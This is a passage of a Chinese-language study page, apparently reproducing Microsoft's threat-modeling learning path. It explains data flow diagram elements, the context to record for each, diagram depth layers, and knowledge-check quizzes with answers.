title="小结"></a>小结</h3><h4 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h4><p>威胁建模是帮助保护系统、应用程序、网络和服务的有效方法。 它可以识别潜在的威胁并推荐风险降低策略，以帮助你在开发生命周期的早期实现安全目标。</p><p>本模块涵盖了以下内容：</p><ul><li>了解明确要求和假设以帮助创建数据流关系图的重要性</li><li>了解可帮助你查找系统中安全问题的框架</li><li>了解有助于减轻或消除潜在威胁的安全控制类别</li><li>重点介绍在部署之前验证假设、要求和修复的重要性</li></ul><h4 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h4><p>在此学习路径的后续几个模块中，我们将了解在四个阶段引入的每个概念，并进行详细讨论：</p><table><thead><tr><th align="left">模块</th><th align="left">标题</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">使用数据流关系图元素创建威胁模型</td><td align="left">了解数据流关系图中的每个元素，包括何时使用它们以及要包含的上下文。</td></tr><tr><td align="left">3</td><td align="left">提供具有适当深度层的上下文</td><td align="left">在创建数据流关系图之前，了解每个上下文层次的差异和适用情形。</td></tr><tr><td align="left">4</td><td align="left">处理数据流关系图时关注适当的威胁模型</td><td align="left">了解关注威胁建模活动的不同方法。</td></tr><tr><td align="left">5</td><td align="left">使用框架识别威胁并找到减少或消除风险的方法</td><td align="left">深入研究 STRIDE，并进一步了解存在的风险以及如何针对这些风险保护系统。</td></tr><tr><td align="left">6</td><td align="left">设置问题的优先级并应用安全控制措施</td><td align="left">了解如何设置威胁优先级，并了解系统安全控制的不同类型和功能。</td></tr><tr><td align="left">7</td><td align="left">使用推荐工具创建数据流图</td><td align="left">了解可用于威胁建模的工具。</td></tr></tbody></table><h4 id="了解详细信息"><a href="#了解详细信息" class="headerlink" title="了解详细信息"></a>了解详细信息</h4><div class="tag link"><a class="link-card" title="安全开发生命周期" href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling"><div class="left"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="lazyload" data-srcset="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">安全开发生命周期</p><p class="url">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</p></div></a></div><h2 id="模块2-使用数据流关系图元素创建威胁模型"><a href="#模块2-使用数据流关系图元素创建威胁模型" class="headerlink" title="模块2 | 使用数据流关系图元素创建威胁模型"></a>模块2 | 使用数据流关系图元素创建威胁模型</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>数据流关系图由呈现为形状和线条的元素构成。 数据流关系图以图形方式表示系统的各个主要部分。</p><p>示例包括：</p><ul><li>用于存储客户数据的 Azure DB</li><li>处理用户请求的 Web 服务</li><li>与系统交互的用户</li><li>跨信任区域级别更改的数据流</li></ul><p>在威胁建模中使用元素及其交互，以帮助确定威胁并降低系统风险。 此过程可帮助工程师更有效地进行协作，同时保护其系统免受最常见的威胁攻击。</p><p><strong><u>本模块将介绍数据流关系图的每个元素。 这些元素具有不同的形状和功能，并且需要特定的上下文。</u></strong></p><div class="note info"><p>在整个学习路径中，元素也可以称为“模具”。</p></div><h4 id="何时使用元素"><a href="#何时使用元素" class="headerlink" title="何时使用元素"></a>何时使用元素</h4><p>在创建数据流关系图时使用这些元素。 关系图可显示系统创建、操纵、存储以及删除数据的方式。 我们以第一个模块中的示例为基础进行构建：</p><ul><li><strong>Azure 微服务</strong> - 添加元素以指定用户、身份验证过程、数据存储、数据请求和响应处理过程。<ul><li>别忘了指定信任区域级别更改。</li></ul></li><li><strong>公共 API</strong> - 添加元素以指定用户、数据存储、日志记录和监视流程以及系统的其他部分。</li><li><strong>现有应用程序上的新功能</strong> - 添加元素以表示系统的现有部分和新的部分。</li></ul><h4 id="学习目标-1"><a href="#学习目标-1" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>区分每个元素的形状和功能</li><li>在创建数据流关系图时，包含元素的正确上下文</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="数据流关系图元素"><a href="#数据流关系图元素" class="headerlink" title="数据流关系图元素"></a>数据流关系图元素</h3><p>数据流关系图由各种形状组成，这些形状用于创建系统的图形表示形式。 每个形状都表示一个独特的功能。 系统将分析每个交互以帮助识别潜在的威胁和找到降低风险的方法。</p><p>通过正确使用形状，你能更好地明白同事和安全团队提供的信息。 每个人都能了解该系统的工作方式。 这还可以使他们无需查阅无数的设计文档和开发计划即可启动系统并使其正常运行。</p><div class="note info"><p>如果无法在数据流关系图中正确地体现系统的所有部分，则有可能部署具有潜在漏洞的系统。</p></div><table><thead><tr><th align="left">元素</th><th align="left">形状</th><th align="left">定义</th><th>示例</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">接收、修改输入或将输入重定向到输出的任务，如 Web 服务。</td><td>Web 服务</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。</td><td>Web 缓存和 Azure DB</td></tr><tr><td align="left">外部实体</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">直接控制之外的任务、实体或数据存储，如用户和第三方 API。</td><td>用户和第三方 API</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。</td><td>连接字符串和有效负载</td></tr><tr><td align="left">信任边界</td><td align="left"><img src="/img/thread-modeling/trust-boundary-box50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-box50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-box50"><img src="/img/thread-modeling/trust-boundary-line50-7523817.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-line50-7523817.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-line50"></td><td align="left">信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。</td><td>用户通过 Internet 连接到安全的公司网络</td></tr></tbody></table><p>我们将在接下来的几个单元中讨论每个元素。</p><h3 id="过程-任务元素"><a href="#过程-任务元素" class="headerlink" title="过程 - 任务元素"></a>过程 - 任务元素</h3><p><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></p><p>此元素用一个圆圈表示，表示<u><strong>可以修改接收的输入或将接收的输入重定向到其相应输出的活动</strong></u>。</p><p>示例包括：</p><ul><li>接收 API 调用请求并将其转发到 API 处理服务的微服务</li><li>在数据写入数据存储之前验证数据输入的代码</li></ul><h4 id="何时使用过程元素"><a href="#何时使用过程元素" class="headerlink" title="何时使用过程元素"></a>何时使用过程元素</h4><p>在以下项之间添加过程元素：</p><ul><li><strong>数据存储</strong> - 处理数据存储之间的所有通信的过程</li><li><strong>具有其他元素的外部实体</strong> - 处理所有任务和通信的过程</li><li><strong>过程</strong> - 处理所有任务的过程</li></ul><p>根据数据流关系图所需的信息深度级别，可以使用过程元素来表示几个不同的用例：</p><table><thead><tr><th align="left">用例</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">存根</td><td align="left">在较高级别的数据流关系图中将过程元素用作“存根”，这是一种有助于保持整洁的好方法。 它涉及为特定过程创建一个单独的数据流关系图，并将其映射回更高级别的关系图。 它的工作方式类似于“放大”功能，在“放大”过程时，可以使用深层数据流关系图。</td></tr><tr><td align="left">多个任务</td><td align="left">当过程处理多个任务时，此用例适用。 此上下文非常重要，因为它允许查看数据流程图的任何人为每个任务应用适当的安全控制。</td></tr></tbody></table><h4 id="包括上下文"><a href="#包括上下文" class="headerlink" title="包括上下文"></a>包括上下文</h4><p>在每个过程元素中包含以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">代码</td><td align="left">此过程是否以 C#、C++、Objective C、Java 或脚本语言运行？</td></tr><tr><td align="left">权限级别</td><td align="left">此过程是否需要内核、本地或管理级别权限才能运行？</td></tr><tr><td align="left">服务隔离</td><td align="left">该过程是否在沙盒中运行？</td></tr><tr><td align="left">输入</td><td align="left">此过程可以接受所有人、本地帐户还是仅限管理员的输入？</td></tr><tr><td align="left">验证</td><td align="left">此过程如何分析、处理和接受输入？</td></tr><tr><td align="left">身份验证</td><td align="left">此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？</td></tr><tr><td align="left">授权</td><td align="left">它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？</td></tr></tbody></table><h4 id="知识检查-4"><a href="#知识检查-4" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最能描述过程？</li></ol><div class='checkbox'><input type="radio" />            <p>A. Web 门户要求用户提供其凭据。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 缓存为用户存储与服务相关的 Cookie。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 第三方 API 向其请求者发送请求的数据。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 门户将处理用户输入，并将其发送到过程的下一部分。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。</psw></p><h3 id="数据存储-存储元素"><a href="#数据存储-存储元素" class="headerlink" title="数据存储 - 存储元素"></a>数据存储 - 存储元素</h3><p><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></p><p>此元素用平行线表示，表示<u><strong>临时或永久存储的数据</strong></u>。</p><p>示例包括：</p><ul><li>使用浏览器缓存来存储与用户会话相关的数据</li><li>向数据库添加安全日志事件</li></ul><h4 id="何时使用数据存储元素"><a href="#何时使用数据存储元素" class="headerlink" title="何时使用数据存储元素"></a>何时使用数据存储元素</h4><ul><li>在每次将数据存储在 Azure DB 或本地缓存等位置时</li><li>如果要在两个数据存储之间建立通信，请不要忘记在它们之间添加进程</li><li>数据存储和外部实体都可启动数据流，因此请验证这两者中的任意一个是否已就绪</li><li>确保将数据后期处理包含在内，例如 Azure Analytics 等分析服务。 此过程经常被忽略。</li></ul><h4 id="包含上下文"><a href="#包含上下文" class="headerlink" title="包含上下文"></a>包含上下文</h4><p>在每个数据存储元素中包含以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">类型</td><td align="left">系统是否使用 Azure SQL、Cookie、本地或其他某种类型的存储？ 如果是，系统使用的是哪种存储？</td></tr><tr><td align="left">功能</td><td align="left">如何使用存储？ 它是否用于共享数据、存储备份、安全日志、凭据和机密？</td></tr><tr><td align="left">权限级别</td><td align="left">如何实现访问控制？ 拥有读写权限的人员有哪些？</td></tr><tr><td align="left">其他控制</td><td align="left">数据是否加密？ 磁盘是否加密？ 是否使用数字签名？</td></tr></tbody></table><h4 id="知识检查-5"><a href="#知识检查-5" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最能描述数据存储？</li></ol><div class='checkbox'><input type="radio" />            <p>A. Web 门户要求用户提供其凭据。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 缓存为用户存储与服务相关的 Cookie。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 第三方 API 向其请求者发送请求的数据。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 处理输入和输出的行为是与过程相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。</psw></p><h3 id="外部实体-无控制元素"><a href="#外部实体-无控制元素" class="headerlink" title="外部实体 - 无控制元素"></a>外部实体 - 无控制元素</h3><p><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></p><p>外部实体元素由正方形表示，<u><strong>外部实体可以是过程、数据存储，甚至是直接控制之外的完整系统</strong></u>。</p><p>示例包括：</p><ul><li>与服务交互的用户</li><li>与第三方身份验证服务紧密集成</li><li>组织内由其他团队创建的服务</li></ul><h4 id="何时使用外部实体元素"><a href="#何时使用外部实体元素" class="headerlink" title="何时使用外部实体元素"></a>何时使用外部实体元素</h4><ul><li>在要表示不能直接修改的内容时</li><li>数据存储和外部实体都可启动数据流，因此请验证这两者中的任意一个是否已就绪</li></ul><h4 id="包含上下文-1"><a href="#包含上下文-1" class="headerlink" title="包含上下文"></a>包含上下文</h4><p>在每个外部实体元素中包含以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">源</td><td align="left">实体是内部实体还是外部实体？</td></tr><tr><td align="left">类型</td><td align="left">实体是用户、服务提供商还是 Web 服务？</td></tr><tr><td align="left">身份验证</td><td align="left">此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？</td></tr><tr><td align="left">授权</td><td align="left">它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？</td></tr></tbody></table><h4 id="知识检查-6"><a href="#知识检查-6" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最准确地描述了外部实体？</li></ol><div class='checkbox'><input type="radio" />            <p>A. Web 门户要求用户提供其凭据。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 缓存为用户存储与服务相关的 Cookie。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 第三方 API 向其请求者发送请求的数据。</p>            </div><p>参考答案：<psw>== C ==</psw></p><p>解释：<psw>A. 处理输入和输出的行为是与过程相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。 这 C 答案的解释好像有点问题？应该解释为 第三方 API 向请求者启动了数据流？</psw></p><h3 id="数据流-传输元素中的数据"><a href="#数据流-传输元素中的数据" class="headerlink" title="数据流 - 传输元素中的数据"></a>数据流 - 传输元素中的数据</h3><p><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></p><p>元素之间的数据移动用方向箭头表示，**<u>用于指示数据源和目标之间的通信</u>**。</p><p>示例包括：</p><ul><li>用户提交的用于访问服务的凭据</li><li>过程发出的向数据存储添加项的请求</li></ul><h4 id="何时使用数据流元素"><a href="#何时使用数据流元素" class="headerlink" title="何时使用数据流元素"></a>何时使用数据流元素</h4><ul><li>在每个元素交互之间</li><li>调出正在传输的数据类型，并包括其传输方式</li><li>在大多数情况下，包括对每个请求的响应</li></ul><h4 id="包含上下文-2"><a href="#包含上下文-2" class="headerlink" title="包含上下文"></a>包含上下文</h4><p>包含每个数据流元素的以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">描述</td><td align="left">数据流是否传递会话令牌、SQL 字符串或用户凭据？ 如果不是，那么数据流传递哪些内容？</td></tr><tr><td align="left">协议</td><td align="left">流使用 HTTPS 还是 SOAP？ 如果都不是，那么流使用的是什么协议？</td></tr><tr><td align="left">流序列</td><td align="left">系统是否枚举数据流以便更容易遵循流序列？</td></tr><tr><td align="left">类型</td><td align="left">数据流中包含哪些类型的数据？ Cookie？ XML？ SOAP 有效负载？ REST 有效负载？ JSON 有效负载？</td></tr><tr><td align="left">其他控制</td><td align="left">数据流是否启用了伪造保护？ 是否启用了其他安全标志？</td></tr><tr><td align="left">身份验证</td><td align="left">此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？</td></tr><tr><td align="left">授权</td><td align="left">它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？</td></tr></tbody></table><h4 id="知识检查-7"><a href="#知识检查-7" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最能描述数据流？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 用户凭据从过程传输到身份验证服务提供商。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 存储会话令牌以供以后使用。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 第三方 API 处理服务分析请求。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 传输数据的行为是与数据流相关的事件。B. 存储数据的行为是与数据存储相关的事件。C. 处理数据的行为是与过程相关的事件。</psw></p><h3 id="信任边界-信任区域更改元素"><a href="#信任边界-信任区域更改元素" class="headerlink" title="信任边界 - 信任区域更改元素"></a>信任边界 - 信任区域更改元素</h3><p>信任边界框</p><p><img src="/img/thread-modeling/trust-boundary-box50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-box50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-box50"></p><p>信任边界线</p><p><img src="/img/thread-modeling/trust-boundary-line50-7523829.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-line50-7523829.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-line50"></p><p>信任边界用虚线或方框表示，用于<u><strong>描述跨不同信任区域级别的数据流</strong></u>。</p><p>示例包括：</p><ul><li>防火墙</li><li>与第三方服务的连接</li><li>系统的某些部分仅对管理员可用</li></ul><div class="note radiation red"><p>信任区域不断变化的区域最易受到攻击者的攻击，应谨慎设计此类区域。</p></div><p>Microsoft 已预定义了一些供工程师内部使用的信任区域要求。你能清楚地确定要应用哪些边界。对于 Microsoft 的员工，请与安全团队联系以了解详细信息。</p><h4 id="何时使用信任边界元素"><a href="#何时使用信任边界元素" class="headerlink" title="何时使用信任边界元素"></a>何时使用信任边界元素</h4><p>关于信任边界，需要记住以下几个要点：</p><ul><li>包含信任边界以处理跨不同信任区域的数据流</li><li>信任边界线用于表示跨大型环境（例如 Internet）的数据流</li><li>信任边界框表示小型环境，例如沙盒环境和企业网络</li></ul><h4 id="包含上下文-3"><a href="#包含上下文-3" class="headerlink" title="包含上下文"></a>包含上下文</h4><p>在每个信任边界元素中包含以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">描述</td><td align="left">公司网络边界？Internet？ Azure 订阅？</td></tr></tbody></table><h4 id="知识检查-8"><a href="#知识检查-8" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最能描述跨信任边界的数据？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 用户发送到托管在 Azure 上的 Web 服务的数据。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 在同一 Azure 订阅下，从 Web 服务发送到 Azure 上的数据存储的数据。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 从数据存储发送到 Azure 上同一租户下的进程的数据。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 将数据从不受信任的区域传输到受信任区域的行为跨越了信任边界。B. 从同一受信任区域内的资源传输数据的行为不会跨越信任边界。C. 从同一受信任区域内的资源传输数据的行为不会跨越信任边界。</psw></p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>数据流关系图是系统的图形表示形式，它应包含每个适用的过程、数据存储、外部实体、数据流和信任边界。</p><p>本模块涵盖了以下内容：</p><ul><li>区分了每个元素的形状和功能</li><li>了解了在创建数据流关系图时元素的正确上下文</li></ul><h2 id="模块3-提供具有适当深度层的上下文"><a href="#模块3-提供具有适当深度层的上下文" class="headerlink" title="模块3 | 提供具有适当深度层的上下文"></a>模块3 | 提供具有适当深度层的上下文</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>工程师利用威胁建模能够以图形方式向他人描述系统。 它创建了一个共同的基础，并实现了更加集中的安全对话。</p><h4 id="深度层的重要性"><a href="#深度层的重要性" class="headerlink" title="深度层的重要性"></a>深度层的重要性</h4><p>根据要构建的系统和所需的上下文，威胁模型可能变得太复杂或级别太高。</p><p>数据流关系图深度层可帮助你了解要包含多少上下文以及何时使用它们。</p><div class="note green"><p>请与同事和安全团队联系，选择适当的深度层。 也可以将此模块用作参考。</p></div><h4 id="学习目标-2"><a href="#学习目标-2" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>了解数据流关系图深度层之间的差异</li><li>了解何时使用每个层</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="数据流关系图深度层"><a href="#数据流关系图深度层" class="headerlink" title="数据流关系图深度层"></a>数据流关系图深度层</h3><p>数据流关系图深度层可帮助你确定要成功进行威胁建模练习应包括多少上下文。 有多个因素可帮助确定要了解的深度。</p><p>每个系统都应该大致了解它们的工作方式。 大多数系统应该具有附加的数据流关系图，这些关系图侧重于需要仔细研究的系统部分。</p><p>示例包括：</p><ul><li>分析高度敏感数据的过程</li><li>第三方身份验证系统</li></ul><p>威胁建模中大致使用了四个深度层：</p><table><thead><tr><th align="left">层</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">对于所有系统都是必需的，并且包含主要系统部分。</td></tr><tr><td align="left">1</td><td align="left">对于大多数系统是必需的，并且包含每个系统部分的其他关系图。</td></tr><tr><td align="left">2</td><td align="left">对于高度敏感的系统是必需的，并且包含系统子部分的其他关系图。</td></tr><tr><td align="left">3</td><td align="left">对于关键级别系统或内核级别系统是必需的，并且包含每个过程的其他关系图。</td></tr></tbody></table><p><img src="/img/thread-modeling/depthlayers.png" class="lazyload" data-srcset="/img/thread-modeling/depthlayers.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="depthlayers"></p><p>我们将在接下来的几个单元中介绍各个深度层。</p><h3 id="第-0-层-系统层"><a href="#第-0-层-系统层" class="headerlink" title="第 0 层 - 系统层"></a>第 0 层 - 系统层</h3><p>数据流关系图的系统层是任何系统的起点，因此必须为所有系统创建系统层。</p><p><u><strong>目标：</strong></u><strong>表示主要的系统部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。</strong></p><p>系统层关系图应容纳在一个页面中。 它还应只包含系统处理的主要过程。 提供尽可能多的上下文，并清楚标记每个元素，以便任何人都能理解它的工作方式。</p><div class="note green"><p>系统层也称为上下文层。</p></div><h4 id="何时使用系统层"><a href="#何时使用系统层" class="headerlink" title="何时使用系统层"></a>何时使用系统层</h4><p>你创建的每个系统都需要系统层。 高级别的上下文可以帮助任何人深入了解系统，从而参与更有意义的讨论。</p><h4 id="深入了解系统部分"><a href="#深入了解系统部分" class="headerlink" title="深入了解系统部分"></a>深入了解系统部分</h4><p>在大多数情况下，系统部分需要进行更深入的研究，因为它们会带来风险。</p><p>示例包括：</p><ul><li><u>任何新系统都会给环境带来未知风险</u></li><li>新的分析程序、协议和文件格式</li><li>新的身份验证和授权机制</li><li>新的机密存储或加密算法</li><li><u>与第三方身份验证系统（例如 Facebook）集成</u></li><li>主要功能所需的提升权限</li><li>所需的未加密信道</li></ul><p>如果是这种情况，请为每个系统部分创建其他数据流关系图。 执行以下步骤：</p><table><thead><tr><th align="left">步骤</th><th align="left">指南</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">使用清晰的描述标签创建一个过程元素，例如“Web 服务名称”。</td></tr><tr><td align="left">2</td><td align="left">创建一个新文件，并完全按照描述标签为其命名。</td></tr><tr><td align="left">3</td><td align="left">仅将数据流关系图侧重于要“放大”的系统部分。</td></tr></tbody></table><p>结果将获得过程层（称为第 1 层）中的一系列数据流关系图。</p><h4 id="知识检查-9"><a href="#知识检查-9" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>第 0 层通常被称为什么？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 上下文层。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 过程层。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 子过程层。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 此层是任何系统的起点。 也称为系统层。B. 此层侧重于每个系统部分。C. 此层侧重于特定系统部分的系统子部分。</psw></p><h3 id="第-1-层-过程层"><a href="#第-1-层-过程层" class="headerlink" title="第 1 层 - 过程层"></a>第 1 层 - 